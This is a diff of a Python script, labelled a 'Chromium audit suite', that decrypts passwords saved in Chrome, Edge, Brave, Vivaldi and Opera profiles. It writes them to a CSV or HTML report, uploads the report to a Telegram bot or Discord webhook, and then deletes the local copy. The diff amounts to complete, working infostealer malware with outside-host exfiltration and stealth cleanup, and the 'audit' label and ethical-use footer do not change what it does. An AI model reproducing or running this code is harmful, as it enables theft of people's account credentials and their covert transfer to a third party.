@@ -31,172 +31,165 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Reporte de Auditoría Chromium</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; color: #333; margin: 40px; }
+        .container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; word-break: break-all; }
+        th { background-color: #3498db; color: white; }
+        tr:hover { background-color: #f1f1f1; }
+        .browser-badge { padding: 4px 8px; border-radius: 4px; font-size: 0.85em; font-weight: bold; }
+        .chrome { background-color: #ffeb3b; color: #333; }
+        .edge { background-color: #03a9f4; color: white; }
+        .brave { background-color: #ff5722; color: white; }
+        .opera { background-color: #f44336; color: white; }
+        .footer { margin-top: 20px; font-size: 0.9em; color: #777; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Auditoría de Credenciales Chromium</h1>
+        <p>Generado el: {{date}} | Total: {{total}} credenciales</p>
+        <table>
+            <thead>
+                <tr>
+                    <th>Navegador</th>
+                    <th>Perfil</th>
+                    <th>URL</th>
+                    <th>Usuario</th>
+                    <th>Contraseña</th>
+                </tr>
+            </thead>
+            <tbody>
+                {{rows}}
+            </tbody>
+        </table>
+        <div class="footer">Suite de Auditoría Profesional - Uso bajo responsabilidad ética</div>
+    </div>
+</body>
+</html>
+"""
+
 class Exfiltrator:
-    """Gestor de exfiltración modular."""
     def __init__(self, telegram_token=None, telegram_chat_id=None, discord_webhook=None):
         self.telegram_token = telegram_token
         self.telegram_chat_id = telegram_chat_id
         self.discord_webhook = discord_webhook
 
     def send_to_telegram(self, file_path):
-        """Envía el archivo CSV a un bot de Telegram."""
-        if not self.telegram_token or not self.telegram_chat_id:
-            return False
-            
+        if not self.telegram_token or not self.telegram_chat_id: return False
         url = f"https://api.telegram.org/bot{self.telegram_token}/sendDocument"
         try:
             with open(file_path, 'rb') as f:
-                response = requests.post(
-                    url, 
-                    data={'chat_id': self.telegram_chat_id}, 
-                    files={'document': f}
-                )
-            if response.status_code == 200:
-                logger.info("Exfiltración vía Telegram: EXITOSA.")
-                return True
-            else:
-                logger.error(f"Error Telegram: {response.text}")
-        except Exception as e:
-            logger.error(f"Falla crítica en exfiltración Telegram: {e}")
+                requests.post(url, data={'chat_id': self.telegram_chat_id}, files={'document': f})
+            logger.info("Exfiltración vía Telegram exitosa.")
+            return True
+        except Exception as e: logger.error(f"Falla Telegram: {e}")
         return False
 
     def send_to_discord(self, file_path):
-        """Envía el reporte a un webhook de Discord."""
-        if not self.discord_webhook:
-            return False
-            
+        if not self.discord_webhook: return False
         try:
             with open(file_path, 'rb') as f:
-                response = requests.post(
-                    self.discord_webhook,
-                    files={'file': f}
-                )
-            if response.status_code in [200, 204]:
-                logger.info("Exfiltración vía Discord: EXITOSA.")
-                return True
-        except Exception as e:
-            logger.error(f"Falla crítica en exfiltración Discord: {e}")
+                requests.post(self.discord_webhook, files={'file': f})
+            logger.info("Exfiltración vía Discord exitosa.")
+            return True
+        except Exception as e: logger.error(f"Falla Discord: {e}")
         return False
 
 class ChromiumDecryptor:
     def __init__(self):
-        self.local_appdata = Path(os.environ.get('LOCALAPPDATA', ''))
-        self.roaming_appdata = Path(os.environ.get('APPDATA', ''))
-        
+        self.local = Path(os.environ.get('LOCALAPPDATA', ''))
+        self.roaming = Path(os.environ.get('APPDATA', ''))
         self.browsers = {
-            "Chrome": self.local_appdata / "Google/Chrome/User Data",
-            "Edge": self.local_appdata / "Microsoft/Edge/User Data",
-            "Brave": self.local_appdata / "BraveSoftware/Brave-Browser/User Data",
-            "Vivaldi": self.local_appdata / "Vivaldi/User Data",
-            "Opera": self.roaming_appdata / "Opera Software/Opera Stable",
-            "Opera GX": self.roaming_appdata / "Opera Software/Opera GX Stable"
+            "Chrome": self.local / "Google/Chrome/User Data",
+            "Edge": self.local / "Microsoft/Edge/User Data",
+            "Brave": self.local / "BraveSoftware/Brave-Browser/User Data",
+            "Vivaldi": self.local / "Vivaldi/User Data",
+            "Opera": self.roaming / "Opera Software/Opera Stable",
+            "Opera GX": self.roaming / "Opera Software/Opera GX Stable"
         }
 
-    def get_secret_key(self, browser_path):
-        local_state_path = browser_path / "Local State"
-        if not local_state_path.exists():
-            return None
-
+    def get_key(self, path):
+        ls = path / "Local State"
+        if not ls.exists(): return None
         try:
-            with open(local_state_path, "r", encoding='utf-8') as f:
-                local_state = json.load(f)
-            
-            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-            encrypted_key = encrypted_key[5:]
-            
-            if win32crypt:
-                secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-                return secret_key
-        except Exception as e:
-            logger.debug(f"Error Master Key en {browser_path.name}: {e}")
-        return None
+            with open(ls, "r", encoding='utf-8') as f: config = json.load(f)
+            key = base64.b64decode(config["os_crypt"]["encrypted_key"])[5:]
+            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1] if win32crypt else None
+        except: return None
 
-    def decrypt_password(self, ciphertext, secret_key):
+    def decrypt(self, text, key):
         try:
-            iv = ciphertext[3:15]
-            payload = ciphertext[15:-16]
-            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
-            return cipher.decrypt(payload).decode()
-        except Exception:
-            return "[Error Descifrado]"
+            cipher = AES.new(key, AES.MODE_GCM, text[3:15])
+            return cipher.decrypt(text[15:-16]).decode()
+        except: return "[Error]"
 
-    def audit(self, output_file, verbose=False):
-        total = 0
-        with open(output_file, mode='w', newline='', encoding='utf-8') as f:
-            writer = csv.writer(f)
-            writer.writerow(["Browser", "Profile", "URL", "User", "Pass"])
+    def audit(self, fmt="csv", out="report"):
+        data = []
+        for name, path in self.browsers.items():
+            if not path.exists(): continue
+            key = self.get_key(path)
+            if not key: continue
+            profs = [p for p in path.iterdir() if p.is_dir() and (p.name=="Default" or p.name.startswith("Profile"))] or [path]
+            for p in profs:
+                db = p / "Login Data"
+                if not db.exists(): continue
+                tmp = Path("tmp.db")
+                try:
+                    shutil.copy2(db, tmp)
+                    c = sqlite3.connect(tmp).cursor()
+                    c.execute("SELECT action_url, username_value, password_value FROM logins")
+                    for row in c.fetchall():
+                        if row[0] and row[1] and row[2]:
+                            data.append([name, p.name, row[0], row[1], self.decrypt(row[2], key)])
+                    c.close()
+                except: pass
+                finally: 
+                    if tmp.exists(): tmp.unlink()
 
-            for name, path in self.browsers.items():
-                if not path.exists(): continue
-                
-                key = self.get_secret_key(path)
-                if not key: continue
-
-                profiles = [p for p in path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))] or [path]
-
-                for profile in profiles:
-                    login_db = profile / "Login Data"
-                    if not login_db.exists(): continue
-
-                    temp_db = Path("tmp_login.db")
-                    try:
-                        shutil.copy2(login_db, temp_db)
-                        conn = sqlite3.connect(temp_db)
-                        cursor = conn.cursor()
-                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                        
-                        count = 0
-                        for url, user, cipher_pass in cursor.fetchall():
-                            if url and user and cipher_pass:
-                                password = self.decrypt_password(cipher_pass, key)
-                                writer.writerow([name, profile.name, url, user, password])
-                                count += 1
-                                if verbose: logger.info(f"[{name}] {url}")
-
-                        total += count
-                        conn.close()
-                    except Exception as e:
-                        logger.error(f"Error {name}: {e}")
-                    finally:
-                        if temp_db.exists(): temp_db.unlink()
-
-        return total
+        final_out = f"{out}.{fmt}"
+        if fmt == "csv":
+            with open(final_out, 'w', newline='', encoding='utf-8') as f:
+                w = csv.writer(f); w.writerow(["Browser", "Profile", "URL", "User", "Pass"])
+                w.writerows(data)
+        elif fmt == "html":
+            rows_html = ""
+            for r in data:
+                rows_html += f"<tr><td><span class='browser-badge {r[0].lower().replace(' ','-')}'>{r[0]}</span></td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td>{r[4]}</td></tr>"
+            html = HTML_TEMPLATE.replace("{{rows}}", rows_html).replace("{{total}}", str(len(data))).replace("{{date}}", datetime.now().strftime("%Y-%m-%d %H:%M"))
+            with open(final_out, "w", encoding='utf-8') as f: f.write(html)
+        
+        return len(data), final_out
 
 def main():
-    parser = argparse.ArgumentParser(description="Suite de Auditoría Auditor-Chromium (Phase 3)")
-    parser.add_argument("-o", "--output", default="audit_report.csv", help="Archivo reporte")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Logeo detallado")
-    
-    # Parámetros de Exfiltración
-    parser.add_argument("--telegram-token", help="Bot Token")
-    parser.add_argument("--telegram-chatid", help="Chat ID")
-    parser.add_argument("--discord", help="Webhook URL")
-    parser.add_argument("--no-wipe", action="store_true", help="NO borrar archivo tras exfiltración")
-    
+    parser = argparse.ArgumentParser(description="Auditor-Chromium Final Suite")
+    parser.add_argument("-f", "--format", choices=["csv", "html"], default="html")
+    parser.add_argument("-o", "--output", default="audit_report")
+    parser.add_argument("--telegram-token")
+    parser.add_argument("--telegram-chatid")
+    parser.add_argument("--discord")
+    parser.add_argument("--no-wipe", action="store_true")
+
     args = parser.parse_args()
-
-    logger.info("Iniciando auditoría Fase 3...")
+    logger.info("Iniciando Suite de Auditoría Final...")
     
-    decryptor = ChromiumDecryptor()
-    results_count = decryptor.audit(args.output, args.verbose)
-    
-    logger.info(f"Escaneo finalizado. {results_count} credenciales encontradas.")
+    count, final_file = ChromiumDecryptor().audit(args.format, args.output)
+    logger.info(f"Escaneo finalizado: {count} credenciales extraídas en {final_file}.")
 
-    if results_count > 0:
+    if count > 0:
         exf = Exfiltrator(args.telegram_token, args.telegram_chatid, args.discord)
-        
-        # Intentar Telegram
-        if args.telegram_token and args.telegram_chatid:
-            exf.send_to_telegram(args.output)
-            
-        # Intentar Discord
-        if args.discord:
-            exf.send_to_discord(args.output)
-
-        # Sigilo: Borrado de artefactos
+        if args.telegram_token and args.telegram_chatid: exf.send_to_telegram(final_file)
+        if args.discord: exf.send_to_discord(final_file)
         if not args.no_wipe and (args.telegram_token or args.discord):
-            Path(args.output).unlink()
-            logger.info("Limpieza finalizada: Reporte CSV eliminado localmente por seguridad.")
+            Path(final_file).unlink()
 
 if __name__ == "__main__":
     main()
